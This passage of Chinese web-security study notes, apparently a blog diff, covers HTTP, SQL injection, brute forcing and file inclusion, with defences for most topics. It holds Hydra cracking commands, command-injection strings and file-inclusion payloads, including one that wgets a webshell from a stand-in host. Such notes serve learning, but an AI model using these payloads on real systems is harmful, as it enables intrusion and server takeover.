+测试期间，appscan会发送他在探索阶段创建的成千上万个定制的测试请求，通过你定制好的测试策略分析每个测试的响应，最后根据规则是被应用程序中的安全问题，并排列这些安全问题的风险级别。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1625838109553.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1625838172571.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1625838201810.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1625838266154.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1625838272486.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1625838325110.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1625838356236.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1625838408835.png" alt="" loading="lazy"></figure>
+<h1 id="其他漏洞扫描器">其他漏洞扫描器</h1>
+<p>商业：</p>
+<p>Netsparker<br>
+WebInspect</p>
+<p>开源：</p>
+<p>W3af<br>
+Owasp Zap</p>
+<h1 id="2021-07-13">2021-07-13</h1>
+<p>#HTTP协议解析</p>
+<p>HTTP（HyperText Transfer Protocol）即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则，它是万维网交换信息的基础，它允许将HTML（超文本标记语言）文档从Web服务器传送到Web浏览器。<br>
+HTTP协议目前最新版的版本是1.1，HTTP是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>
+HTTP遵循请求（Request）/应答（Response）模型，Web浏览器向Web服务器发送请求时，Web服务器处理请求并返回适当的应答，如图所示。</p>
+<p>HTTP使用一种基于消息的模型：客户端发送一条请求消息，而后由服务器返回一条响应消息。</p>
+<p><strong>HTTP请求</strong></p>
+<p>HTTP请求包括三部分，分别是请求行（请求方法）、请求头（消息报头）和请求正文。<br>
+HTTP请求第一行为请求行，由三部分组成，第一部分说明了该请求时POST请求，第二部分是一个斜杠（/login.php），用来说明请求是该域名根目录下的login.php，第三部分说明使用的是HTTP1.1版本。<br>
+HTTP请求第二行至空白行为请求头（也被称为消息头）。其中，HOST代表请求主机地址，User-Agent代表浏览器的标识，请求头由客户端自行设定。<br>
+HTTP请求第三行为请求正文，请求正文是可选的，它最常出现在POST请求方式中。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626137217773.png" alt="" loading="lazy"></p>
+<p><strong>HTTP响应</strong></p>
+<p>HTTP响应的第一行为响应行，其中有HTTP版本（HTTP/1.1）、状态码（200）以及消息“OK”。<br>
+第二行至末尾的空白行为响应头，由服务器向客户端发送。<br>
+消息头之后是响应正文，是服务器向客户端发送的HTML数据。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626137221463.png" alt="" loading="lazy"></p>
+<p><strong>HTTP请求方法</strong></p>
+<p>GET：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。<br>
+POST：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。<br>
+<strong>HEAD</strong>：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。<br>
+<strong>PUT</strong>：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626137441142.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1626137640179.png" alt="" loading="lazy"></figure>
+<p>PUT：向指定的目录上传附加文件<br>
+DELETE：删除指定的资源<br>
+COPY：将指定的资源复制到Destination消息头的指定的位置<br>
+SEARCH：在一个目录路径中搜索资源<br>
+PROPFIND：获取与指定资源有关的信息，如作者，大小与内容类型<br>
+TRACE：在响应中返回服务器收到的原始请求，可以使用这种方法避开阻止跨站点脚本的防御</p>
+<p><strong>状态码</strong><br>
+1xx：信息提示，表示请求已经被成功接收，继续处理<br>
+2xx：请求被成功提交<br>
+3xx：客户端被重定向到其他资源<br>
+4xx：客户端错误状态码，格式错误或者不存在资源<br>
+5xx：描述服务器内部错误</p>
+<p>eg：<br>
+200：客户端请求成功<br>
+302：重定向<br>
+404：请求资源不存在<br>
+400：客户端请求有语法错误不能被服务器解析<br>
+401：请求未经授权<br>
+403：服务器收到请求，但是拒绝提供服务<br>
+500：服务器内部错误<br>
+503：服务器当前不能处理客户端的请求</p>
+<p>拦截HTTP请求的分析点：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626138712203.png" alt="" loading="lazy"></p>
+<p>Host 请求报头域主要用于指定被请求资源的Internet主机和端口。<br>
+User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。<br>
+Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。<br>
+Cookie 是非常重要的请求头，常用来表示请求者的身份等。<br>
+Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。</p>
+<p>响应<br>
+Server<br>
+Location<br>
+Content-Type<br>
+Content-Encoding<br>
+Content-Length<br>
+Connection</p>
+<p>Server 服务器使用的Web服务器名称。<br>
+Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。<br>
+Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。<br>
+Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。<br>
+Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。<br>
+Connection 允许发送指定连接的选项。</p>
+<p>Fiddler是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。<br>
+Burp Suite是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
+<h1 id="sql注入">SQL注入</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626147562167.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626147659762.png" alt="" loading="lazy"></p>
+<p>静态网页：<br>
+html或者htm，是一种静态的页面格式，不需要服务器解析其中的脚本。由浏览器如(IE、Chrome等)解析。<br>
+1.不依赖数据库<br>
+2.灵活性差，制作、更新、维护麻烦<br>
+3.交互性交差，在功能方面有较大的限制<br>
+4.安全，不存在SQL注入漏洞</p>
+<p>动态网页：<br>
+asp、aspx、php、jsp等，由相应的脚本引擎来解释执行，根据指令生成静态网页。<br>
+1.依赖数据库<br>
+2.灵活性好，维护简便<br>
+3.交互性好，功能强大<br>
+4.存在安全风险，可能存在SQL注入漏洞</p>
+<figure data-type="image" tabindex="19"><img src="https://jinqipiaopiao.github.io//post-images/1626147842178.png" alt="" loading="lazy"></figure>
+<p>sql注入定义：<br>
+SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<pre><code>   具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句
+</code></pre>
+<p><strong>解释性语言</strong><br>
+正是基于前面背景的认识，我们知道SQL语言是解释型语言，解释型语言的基本特征就是代码与数据的不区分，从而存在注入数据改变原有语义的缺陷。而SQL注入的本质正是基于此，改变原有语义，注入执行。<br>
+就如生活中的造句一样，比如：<br>
+我要吃（），正常说（饭），大家都觉得很正常，如果说（虫子），大家就觉得这人口味好重，意思就完全不一样了。</p>
+<p><strong>SQL注入作用</strong></p>
+<p>绕过登录验证：使用万能密码登录网站后台等<br>
+获取敏感数据：获取网站管理员帐号、密码等<br>
+文件系统操作：列目录，读取、写入文件等<br>
+注册表操作：读取、写入、删除注册表等<br>
+执行系统命令：远程执行命令</p>
+<p><strong>SQL注入过程</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626148004241.png" alt="" loading="lazy"></p>
+<p><strong>场景</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626148045381.png" alt="" loading="lazy"></p>
+<p><strong>数据库注释语法</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626148084746.png" alt="" loading="lazy"></p>
+<p><strong>SQL注入分类</strong></p>
+<p>按照数据类型：数字型，字符型<br>
+按返回结果：显错注入，盲注<br>
+其他：<br>
+post注入：注入字段在post数据中<br>
+cookie注入同理<br>
+搜索注入：注入处为搜索的点<br>
+Base64注入：注入字符串需要经过base64加密<br>
+布尔型注入：根据返回页面判断条件真假的注入<br>
+时间延迟盲注：即不能根据页面返回内容判断任何信息，用条件语句查看延迟语句是否执行判断<br>
+报错会先注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中<br>
+联合查询型注入：可以使用union的情况下的注入<br>
+堆查询注入：可以同时执行多条语句的执行时的注入</p>
+<p>利用工具：sqlmap，jsql<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626148527402.png" alt="" loading="lazy"></p>
+<p><strong>SQL注入危害：</strong><br>
+这些危害包括但不局限于：</p>
+<p>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br>
+网页篡改：通过操作数据库对特定网页进行篡改。<br>
+网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br>
+数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>
+服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>
+破坏硬盘数据，瘫痪全系统。</p>
+<p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p>
+<p>防御：<br>
+过滤特殊字符：<br>
+单引号，双引号，斜杠，反斜杠，冒号，空字符等的字符<br>
+过滤的对象：<br>
+用户的输入<br>
+提交的url请求中的参数部分<br>
+从cookie中得到的数据<br>
+部署防sql注入系统或脚本</p>
+<h1 id="逻辑漏洞">逻辑漏洞</h1>
+<pre><code>   逻辑漏洞只出现于业务流程中（模块功能），也就是说，网站的任何部分都有可能存在着逻辑漏洞。
+</code></pre>
+<p>挖掘逻辑漏洞的思路步骤如下：<br>
+1.发现网站所提供的功能模块，比如：修改密码，找回密码，修改资料等；<br>
+2.针对具体功能确定业务流程，详细划分具体步骤；<br>
+3.拦截请求，分析各项参数所代表的含义；<br>
+4.修改参数值，尝试触发逻辑漏洞；<br>
+5.返回第2步骤，对其他功能继续测试。<br>
+挖掘逻辑漏洞的两个重点，分析业务流程和拦截请求修改</p>
+<h1 id="2021-07-14">2021-07-14</h1>
+<h1 id="暴力破解">暴力破解</h1>
+<p>定义：暴力破解也被称为枚举测试，穷举法测试，是一种针对密码破译的方法，即：将密码逐个比较，知道找出 真正的密码为止。<br>
+攻击者在渗透目标的时候，刚开始可能并不会直接采取暴力破解的方式去入侵，因为使用暴力破解方式是一项比较耗时的攻击。一般攻击者对应用程序“没办法”时才会采取这种手段<br>
+B/S架构利用burp suite<br>
+C/S架构利用THC-Hydra<br>
+官网：https://www.thc.org/thc-hydra/<br>
+项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
+<p>支持的协议：<br>
+Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
+HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
+HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
+MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
+PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
+SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
+Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
+<p>官网：https://www.thc.org/thc-hydra/<br>
+项目地址：https://github.com/vanhauser-thc/thc-hydra</p>
+<p>支持的协议：<br>
+Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET,<br>
+HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,<br>
+HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,<br>
+MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,<br>
+PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,<br>
+SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion,<br>
+Teamspeak (TS2), Telnet, VMware-Auth, VNC，XMPP</p>
+<p>举例：破解3389：<br>
+Hydra.exe –l administrator –P c:\pass.txt 192.168.1.123 rdp –V</p>
+<p>破解FTP：<br>
+Hydra.exe –l admin –P c:\pass.txt –t 5 192.168.1.123 ftp</p>
+<p>破解SSH：<br>
+Hydra.exe –L users.txt –P password.txt –e n –t 5 –vV 192.168.1.123 ssh</p>
+<p>破解MySQL密码：<br>
+Hydra.exe –L c:\users.txt –P c:\pass.txt 192.168.1.123 mysql</p>
+<p>防止暴力破解：<br>
+1.密码的复杂性（八位以上的字母+数字+特殊字符）<br>
+2.验证码（图片，手机验证码，邮箱验证码，答题验证码）<br>
+3.登陆策略（限制登陆错误次数）</p>
+<p>#远程执行漏洞</p>
+<p>RCE漏洞：远程命令执行漏洞； 应用程序有时需要调用一些执行系统命令的函数，如在PHP当中，使用system,exec,shell_exec,passthru,popen,proc_popen等函数可以执行系统命令。<br>
+当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成RCE攻击，这就是RCE漏洞。<br>
+命令执行漏洞是指攻击者可以随意执行系统命令。它属于高危漏洞之一，也属于代码执行的范畴。<br>
+命令执行漏洞不仅存在于B/S架构中，在C/S架构中也常常遇到。</p>
+<p>ping 127.0.0.1 &amp;&amp; net user        &amp;&amp;前面的语句若为假则直接报出错，也不执行后边的命令了。 要想继续执行&amp;&amp;后边的命令，那前面的语句只能为真！<br>
+ping 127.0.0.1|whoami      直接执行后边的命令<br>
+ping 2 || whoami   当前面的语句执行出错时，执行后边的语句</p>
+<p>任何脚本语言都可以调用操作系统命令，而各个脚本语言的实现方式都不一样。</p>
+<p>区别：<br>
+命令执行漏洞是直接调用操作系统命令<br>
+代码执行漏洞则是靠执行脚本代码调用操作系统命令</p>
+<p><strong>漏洞防范</strong><br>
+1：尽量不要使用命令执行函数<br>
+2：在进入执行命令函数、方法之前，变量一定要做好过滤，对敏感字符转义<br>
+3：在使用动态函数之前，确保使用的函数是指定的函数之一<br>
+4：客户端提交的变量在进入执行命令函数前要做好过滤和检测<br>
+5：对PHP语言来说，不能完全控制的危险函数最好不要使用</p>
+<h1 id="文件包含漏洞">文件包含漏洞</h1>
+<p>原理解析：开发人员通常会把可重复使用的函数写道单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程被称为包含</p>
+<p>文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
+<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>
+<p>当被包含的文件在远程服务器时，就形成的远程文件包含漏洞。</p>
+<p>一些Web站点允许用户输入时指定文件流或允许用户上传文件到服务器。一段时间后web程序访问用户提供的文件。这样，web程序就会执行恶意程序。<br>
+如果文件在本地叫做Local File Inclusion(LFI)，文件在其他主机上的攻击叫做Remote File Inclusion(RFI)。<br>
+注意：file inclusion（文件包含）与arbitrary file access（任务文件访问）或file disclosure（文件泄露）不同。</p>
+<p>漏洞防范：<br>
+1.严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点在于被包含文件是否可以被外部控制<br>
+2.路径限制：限制被包含的文件只能在某一文件夹内，禁止目录跳转字符如：&quot;../&quot;<br>
+3.包含文件验证：验证被包含的文件是否是白名单中的一员<br>
+4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include（&quot;test.php&quot;）；</p>
+<p>思考与要点<br>
+1.PHP中的四个文件包含函数(require,require_once,include,include_once)，因此在挖掘文件包含漏洞时只需要跟踪这四个函数的代码。<br>
+2.php远程包含漏洞需要allow_url_include 为on<br>
+3.挖掘文案金包含漏洞需要对代码有一定的基础<br>
+4.文件包含漏洞dabufenchuxianzaiphp中，其他的如asp，asp.net，jsp也会存在，但相对很少</p>
+<h1 id="详解文件包含">详解文件包含</h1>
+<p><strong>文件包含原理</strong><br>
+文件包含<br>
+开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
+<p>文件包含漏洞<br>
+开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
+<p>0x01文件包含分类<br>
+本地文件包含<br>
+包含服务器本身存在的恶意文件<br>
+a.txt</p>
+<pre><code>&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>b.php</p>
+<pre><code>&lt;?php
+$b=$_GET['id'];
+include($b);
+?&gt;
+</code></pre>
+<p>payload:</p>
+<pre><code>localhost/b.php?id=a.txt //返回phpinfo页面
+</code></pre>
+<p>注：<br>
+两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>
+被包含的页面的后缀无论是什么都会当做PHP解析</p>
+<p>远程文件包含<br>
+包含其他网站上的恶意文件<br>
+远程文件包含利用条件：</p>
+<p>在php.ini中allow_url_fopen=on、allow_url_include=on</p>
+<p>payload：</p>
+<pre><code>localhost/b.php?id=http://ip/文件路径
+</code></pre>
+<p>注：</p>
+<p>远程包含的文件路径必须是绝对路径</p>
+<p>0x02 常用文件包含函数<br>
+PHP</p>
+<pre><code>include()
+</code></pre>
+<p>当使用该函数包含文件时，只有代码执行到include()函数是才将文件包含进来，发生错误时只给出一个警告，继续向下执行</p>
+<pre><code>include_once()
+</code></pre>
+<p>功能和include()相同，区别在于当重复调用同意文件时，程序只调用一次</p>
+<pre><code>requier()
+</code></pre>
+<p>使用require函数包含文件时，只要程序一执行，立即调用脚本；如果前者执行发生错误，函数或输出错误信息，并终止脚本运行</p>
+<pre><code>require_once()
+</code></pre>
+<p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
+<pre><code>jsp/servlet
+ava.io.file()
+
+java.io.filereader()
+
+ASP
+include file
+
+include virtual
+
+0x03 各个协议实现命令执行
+%00截断
+</code></pre>
+<p>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，<br>
+如果有就需要使用%00进行截断<br>
+当php版本&lt;=5.2使用%00截断</p>
+<p>file：//:用于访问本地文件系统</p>
+<p>条件(php.ini)：</p>
+<pre><code>allow_url_fopen   off/on
+allow_url_include off/on
+</code></pre>
+<p>使用方法：<code>file：//[文件的绝对路径和文件名]</code></p>
+<p>php://:访问各个输入输出流</p>
+<p>php伪协议：<br>
+php：//filter：用于读取源码并进行bash64编码输出；<br>
+条件（php.ini）：<br>
+allow_url_fope   off/on<br>
+allow_url_include off/on</p>
+<pre><code>php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；
+条件(php.ini)：
+    allow_url_fope   off/on
+    allow_url_include on
+
+php://stdin是只读的，php://stdout 和 php://stderr 是只写的。
+php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
+php://fd 允许直接访问指定的文件描述符。
+
+zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名
+</code></pre>
+<p>条件：</p>
+<pre><code>allow_url_fope   off/on
+allow_url_include off/on
+</code></pre>
+<p>zip://使用方法：</p>
+<pre><code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
+</code></pre>
+<p>bzip2://使用方法：</p>
+<pre><code>bzip2://file.bz2
+</code></pre>
+<p>zlib://使用方法：</p>
+<pre><code>zlib://file.gz
+
+data://
+</code></pre>
+<p>条件：</p>
+<pre><code>allow_url_fope   on
+allow_url_include on123
+http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
+http://127.0.0.1/cmd.php?file=data://text/plain;base644,加密的php代码
+</code></pre>
+<p>在这里插入图片描述</p>
+<p>phar://:数据流包装器<br>
+http:// 网址<br>
+ftp:// 访问FTP url<br>
+ssh2:// Secure Shell 2<br>
+expect:// 处理交互式的流<br>
+glod:// 查找匹配的文件路径</p>
+<p>0x04 文件包含利用场景<br>
+包含上传文件<br>
+用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用<br>
+防御：</p>
+<pre><code>做好上传限制
+隐藏好文件路径
+设置访问权限、执行权限
+</code></pre>
+<p>伪协议<br>
+php：//input：</p>
+<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。<br>
+条件：</p>
+<pre><code>php &lt;5.0 ，allow_url_include=Off 情况下也可以用
+php &gt; 5.0，只有在allow_url_fopen=On 时才能使用
+</code></pre>
+<p>例：</p>
+<pre><code>http：//localhost/include/file.php?file=php://input     //URL
+&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;  //POST,创建一个文件a.php；并写入phpinfo
+</code></pre>
+<p>data://：</p>
+<p>将原本的include的文件流重定向到了用户可控制的输入流中<br>
+条件：</p>
+<pre><code>allow_url_include=On
+php &gt; 5.2
+</code></pre>
+<p>例：</p>
+<pre><code>http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密&lt;？php system(whoami);？&gt;；直接执行命令
+http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行
+</code></pre>
+<p>php://filter：</p>
+<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过<br>
+例：</p>
+<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径
+http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径
+</code></pre>
+<p>防御：<br>
+尽量使用安全版本的php<br>
+做好php的安全配置<br>
+对相应目录做相应权限设置</p>
+<p>包含日志文件<br>
+1、日志的默认路径<br>
+/etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux<br>
+D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003<br>
+C:WINDOWSsystem32Logfiles                     //iis6.0+win2003<br>
+%SystemDrive%inetpublogsLogFiles            //iis7.0+win2003<br>
+nginx 日志文件在用户安装目录的logs目录下</p>
+<p>2、web中间件默认配置uoh文件<br>
+/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux<br>
+C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003<br>
+C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</p>
+<p>3、利用<br>
+访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：<br>
+http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</p>
+<p>4、防御<br>
+隐藏或修改默认日志文件<br>
+设置日志文件读取权限</p>
+<p>包含/proc/self/environ<br>
+1、找文件包含漏洞<br>
+www.aaa.com/view.php?page=../<br>
+www.aaa.com/view.php?page=../../../../../etc/passwd</p>
+<p>2、检查proc/self/environ是否可以访问<br>
+www.aaa.com/view.php?page=../../../../../proc/self/environ</p>
+<p>3、如果可读就注入代码<br>
+访问：www.aaa.com/view.php?page=../../../../../proc/self/environ<br>
+选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.</p>
+<p>4、访问shell</p>
+<p>5、防御：<br>
+设置proc/self/environ不可访问</p>
+<p>包含Session文件</p>
+<pre><code>?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件
+</code></pre>
+<p>0x05 常见的绕过与防御<br>
+%00截断（php&lt;5.3.4）</p>
+<p>说明：<br>
+PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。<br>
+防御：<br>
+禁用0字节</p>
+<p>超长字符截断</p>
+<p>利用：<br>
+利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。<br>
+我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>
+而利用&quot;./&quot;的方式即可构造出超长目录字符串<br>
+防御：<br>
+限制用户输入字符长度</p>
+<p>任意目录遍历</p>
+<p>利用：<br>
+使用&quot;../../../&quot;这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)&quot;。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)<br>
+防御：<br>
+目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。<br>
+open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)12345</p>
+<p>问号截断</p>
+<p>利用：</p>
+<pre><code>http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
+</code></pre>
+<p>防御：<br>
+关闭远程文件包含的配置选项allow_url_include = Off</p>
+<p>0x06 防御总结<br>
+1、无需情况下设置allow_url_include和allow_url_fopen为关闭<br>
+2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir<br>
+3、尽量不使用动态包含<br>
+4、严格检查变量是否已经初始化。<br>
+5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，<br>
+进行严格的检查，参数中不允许出现../之类的目录跳转符。<br>
+6、严格检查include类的文件包含函数中的参数是否外界可控。<br>
+7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。<br>
+8、在发布应用程序之前测试所有已知的威胁。</p>
+<p>参考文章：https://blog.csdn.net/xg_ren/article/details/79040414</p>
+<h1 id="社会工程学">社会工程学</h1>
+<p>社会工程学简称社工，它是通过对受害者心里弱点，本能反应，好奇，信任，贪婪等心理陷阱进行诸如欺骗，伤害的一种危害手段<br>
+他并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为是最警惕最小心的人，也一样会被高明的社会工程学的手段损害利益<br>
+一个成功的社工师必然是拥有“读心术”的沟通专家，当然，也有人称其为骗子，间谍，社工师就是以这样的名义存在的，对社会工程学有了解的人都应该知道的一个名字-凯文米特尼克以及可以说是每个社工师都比看的一本书--欺骗的艺术</p>
+<p><strong>社会工程学的基本特征</strong></p>
+<p>社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取系统的秘密。</p>
+<p>社会工程学是一种与普通的欺骗/诈骗不同层次的手法，因为社会工程学需要搜集大量的信息针对对方的实际情况，进行心理战术。</p>
+<p>社会工程学往往是一种利用人性脆弱点，贪婪等等的心理表现进行攻击，是防不胜防的。</p>
+<p><strong>生活中的社会工程学</strong></p>
+<p>环境渗透（攻击者采取各种手段进入目标内部，然后利用各种便利条件进行观察或窃听，得到自己所需的信息）</p>
+<p>身份伪造（隐藏真实身份，例如：伪造身份证、ID卡等）</p>
+<p>冒名电话（冒充亲戚、朋友、同学、同事、 上司、下属、高级官员、知名人士等通过电话从目标处获取信息）</p>
+<p>个体配合（如果目标内部人员已经心存不满甚至有了报复的念头，那么……）</p>
+<p><strong>网络中的社会工程学</strong></p>
+<p>地址欺骗<br>
+邮件欺骗<br>
+窗口欺骗<br>
+其它欺骗</p>
+<h1 id="arp欺骗攻击">arp欺骗攻击</h1>
+<p>ARP是Address Resolution Protocol（地址解析协议）的缩写。在以太网中，两台主机想要通信就必须要知道目标主机的MAC地址，如何获取目标主机的MAC地址呢？这就是地址解析协议ARP的工作。</p>
+<p><strong>攻击原理</strong><br>
